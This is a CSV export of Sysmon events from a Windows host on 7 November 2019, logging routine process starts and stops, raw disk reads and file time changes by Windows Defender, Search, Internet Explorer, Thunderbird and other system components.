Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 2992F0C7-135C-227E-E84B-9453A2785272 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:16:36,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:36.132
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:36,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:36.132
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:16:36,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:36.143
ProcessGuid: {CC41BF7E-4FC4-5A01-0000-0010585D1A00}
ProcessId: 5436
Image: C:\Windows\System32\SearchFilterHost.exe
CommandLine: ""C:\Windows\system32\SearchFilterHost.exe"" 0 628 632 640 8192 636 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: Medium
Hashes: SHA1=EB23AC4D23CB9BD84A7D76B091B95785EBE92540
ParentProcessGuid: {CC41BF7E-4CF6-5A01-0000-0010ABA70300}
ParentProcessId: 2736
ParentImage: C:\Windows\System32\SearchIndexer.exe
ParentCommandLine: C:\Windows\system32\SearchIndexer.exe /Embedding"
情報,2019/11/07 15:16:36,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:36.117
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:36,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:36.117
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:16:36,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:36.122
ProcessGuid: {CC41BF7E-4FC4-5A01-0000-0010495B1A00}
ProcessId: 5988
Image: C:\Windows\System32\SearchProtocolHost.exe
CommandLine: ""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe3_ Global\UsGthrCtrlFltPipeMssGthrPipe3 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=DE8ADB411330C39BC9E67C1D8E753206E91E31DF
ParentProcessGuid: {CC41BF7E-4CF6-5A01-0000-0010ABA70300}
ParentProcessId: 2736
ParentImage: C:\Windows\System32\SearchIndexer.exe
ParentCommandLine: C:\Windows\system32\SearchIndexer.exe /Embedding"
情報,2019/11/07 15:16:20,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:16:20.679
ProcessGuid: {CC41BF7E-4FB4-5A01-0000-00106E0F1A00}
ProcessId: 5744
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:16:20,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:20.597
ProcessGuid: {CC41BF7E-4FB4-5A01-0000-00106E0F1A00}
ProcessId: 5744
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:16:09,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:16:09.570
ProcessGuid: {CC41BF7E-4FA3-5A01-0000-0010EFD61900}
ProcessId: 724
Image: C:\Program Files (x86)\Mozilla Thunderbird\thunderbird.exe
TargetFilename: C:\Users\maebashi.gunma\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\5NNNZ1UG74BBIBMENNB8.temp
CreationUtcTime: 2019-09-08 08:18:14.512
PreviousCreationUtcTime: 2019-11-07 06:16:09.570"
情報,2019/11/07 15:16:06,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:16:06.023
ProcessGuid: {CC41BF7E-4FA5-5A01-0000-0010B4ED1900}
ProcessId: 4184
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:16:05,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:05.706
ProcessGuid: {CC41BF7E-4FA5-5A01-0000-0010B4ED1900}
ProcessId: 4184
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:16:04,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:04.852
ProcessGuid: {CC41BF7E-4FA4-5A01-0000-00107FE41900}
ProcessId: 4772
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=5935A1978B114199079C01D48407894AF30C07DA
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:16:03,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:03.179
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:03,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:03.179
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:16:03,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:03.167
ProcessGuid: {CC41BF7E-4FA3-5A01-0000-0010EFD61900}
ProcessId: 724
Image: C:\Program Files (x86)\Mozilla Thunderbird\thunderbird.exe
CommandLine: ""C:\Program Files (x86)\Mozilla Thunderbird\thunderbird.exe"" 
CurrentDirectory: C:\Program Files (x86)\Mozilla Thunderbird\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9D3923767006BC9A94BA6543C94D3535F701D646
ParentProcessGuid: {CC41BF7E-4CF3-5A01-0000-0010EB5D0300}
ParentProcessId: 2144
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE"
情報,2019/11/07 15:15:52,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:15:52.164
ProcessGuid: {CC41BF7E-4F8D-5A01-0000-0010625E1900}
ProcessId: 5228
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:15:52,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:15:52.132
ProcessGuid: {CC41BF7E-4F8D-5A01-0000-0010F5681900}
ProcessId: 5480
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:15:51,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:15:51.226
ProcessGuid: {CC41BF7E-4F96-5A01-0000-00107DAB1900}
ProcessId: 5088
Image: C:\Windows\System32\backgroundTaskHost.exe"
情報,2019/11/07 15:15:50,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:15:50.981
ProcessGuid: {CC41BF7E-4F96-5A01-0000-00107DAB1900}
ProcessId: 5088
Image: C:\Windows\System32\backgroundTaskHost.exe
CommandLine: ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
CurrentDirectory: C:\Windows\SystemApps\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: AppContainer
Hashes: SHA1=8B4E7D875398E67D5277D9C8C9BFA027F9705EDC
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:15:41,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:15:41.389
ProcessGuid: {CC41BF7E-4F8D-5A01-0000-0010F5681900}
ProcessId: 5480
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:5228 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-4F8D-5A01-0000-0010625E1900}
ParentProcessId: 5228
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:15:41,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:15:41.217
ProcessGuid: {CC41BF7E-4F8D-5A01-0000-0010625E1900}
ProcessId: 5228
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:15:16,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:15:16.820
ProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ProcessId: 900
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\ProgramData\USOPrivate\UpdateStore\updatestoretemp51b519d5-b6f5-4333-8df6-e74d7c9aead4.xml
CreationUtcTime: 2019-12-14 17:33:55.212
PreviousCreationUtcTime: 2019-11-07 06:15:16.789"
情報,2019/11/07 15:14:53,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:53.242
ProcessGuid: {CC41BF7E-4F5C-5A01-0000-0010EA2A1900}
ProcessId: 5616
Image: C:\Windows\System32\backgroundTaskHost.exe"
情報,2019/11/07 15:14:52,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:52.864
ProcessGuid: {CC41BF7E-4F5C-5A01-0000-0010EA2A1900}
ProcessId: 5616
Image: C:\Windows\System32\backgroundTaskHost.exe
CommandLine: ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
CurrentDirectory: C:\Windows\SystemApps\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: AppContainer
Hashes: SHA1=8B4E7D875398E67D5277D9C8C9BFA027F9705EDC
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:14:32,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:32.492
ProcessGuid: {CC41BF7E-4F3E-5A01-0000-001018EB1600}
ProcessId: 836
Image: C:\Windows\System32\wermgr.exe"
情報,2019/11/07 15:14:22,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:22.295
ProcessGuid: {CC41BF7E-4F3E-5A01-0000-001062E81600}
ProcessId: 4884
Image: C:\Windows\System32\wermgr.exe"
情報,2019/11/07 15:14:22,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:22.306
ProcessGuid: {CC41BF7E-4F3E-5A01-0000-001018EB1600}
ProcessId: 836
Image: C:\Windows\System32\wermgr.exe
CommandLine: C:\Windows\system32\wermgr.exe -upload
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0C0329767FD84B8D5A00C91925DA6BE954AE6610
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:14:22,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:22.246
ProcessGuid: {CC41BF7E-4F3E-5A01-0000-001062E81600}
ProcessId: 4884
Image: C:\Windows\System32\wermgr.exe
CommandLine: ""C:\Windows\system32\wermgr.exe"" ""-outproc"" ""0"" ""900"" ""4100"" ""376"" ""4088"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0C0329767FD84B8D5A00C91925DA6BE954AE6610
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:16.956
ProcessGuid: {CC41BF7E-4F38-5A01-0000-001072AB1600}
ProcessId: 4740
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:16.925
ProcessGuid: {CC41BF7E-4F38-5A01-0000-001017B01600}
ProcessId: 4368
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:16.925
ProcessGuid: {CC41BF7E-4F38-5A01-0000-0010CEAF1600}
ProcessId: 816
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:16.878
ProcessGuid: {CC41BF7E-4F38-5A01-0000-001040C41600}
ProcessId: 4820
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:16.833
ProcessGuid: {CC41BF7E-4F38-5A01-0000-001040C41600}
ProcessId: 4820
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey BE10886D-E9B3-19AC-648B-0B0FE538C984 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:16.621
ProcessGuid: {CC41BF7E-4F38-5A01-0000-001017B01600}
ProcessId: 4368
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-4F38-5A01-0000-0010CEAF1600}
ParentProcessId: 816
ParentImage: C:\Program Files\Windows Defender\MpCmdRun.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignaturesUpdateService -ScheduleJob -UnmanagedUpdate"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:16.618
ProcessGuid: {CC41BF7E-4F38-5A01-0000-0010CEAF1600}
ProcessId: 816
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignaturesUpdateService -ScheduleJob -UnmanagedUpdate
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:16.606
ProcessGuid: {CC41BF7E-4F38-5A01-0000-00107CAC1600}
ProcessId: 4480
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:16.551
ProcessGuid: {CC41BF7E-4F38-5A01-0000-00104FA81600}
ProcessId: 3968
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:16.535
ProcessGuid: {CC41BF7E-4F38-5A01-0000-0010CAA51600}
ProcessId: 1792
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:16.535
ProcessGuid: {CC41BF7E-4F38-5A01-0000-001005A81600}
ProcessId: 5472
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:16.535
ProcessGuid: {CC41BF7E-4F38-5A01-0000-001080A51600}
ProcessId: 5400
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:16.535
ProcessGuid: {CC41BF7E-4F38-5A01-0000-00107CAC1600}
ProcessId: 4480
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges -Reinvoke
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4F38-5A01-0000-001005A81600}
ParentProcessId: 5472
ParentImage: C:\Program Files\Windows Defender\MpCmdRun.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:16.526
ProcessGuid: {CC41BF7E-4F38-5A01-0000-001072AB1600}
ProcessId: 4740
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges -Reinvoke
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4F38-5A01-0000-001080A51600}
ParentProcessId: 5400
ParentImage: C:\Program Files\Windows Defender\MpCmdRun.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:16.181
ProcessGuid: {CC41BF7E-4F38-5A01-0000-00104FA81600}
ProcessId: 3968
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-4F38-5A01-0000-001005A81600}
ParentProcessId: 5472
ParentImage: C:\Program Files\Windows Defender\MpCmdRun.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:16.178
ProcessGuid: {CC41BF7E-4F38-5A01-0000-001005A81600}
ProcessId: 5472
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:16.147
ProcessGuid: {CC41BF7E-4F38-5A01-0000-0010CAA51600}
ProcessId: 1792
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-4F38-5A01-0000-001080A51600}
ParentProcessId: 5400
ParentImage: C:\Program Files\Windows Defender\MpCmdRun.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges"
情報,2019/11/07 15:14:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:14:16.144
ProcessGuid: {CC41BF7E-4F38-5A01-0000-001080A51600}
ProcessId: 5400
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:14:05,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:14:05.686
ProcessGuid: {CC41BF7E-4F2D-5A01-0000-001012961600}
ProcessId: 4288
Image: C:\Windows\System32\taskhostw.exe"
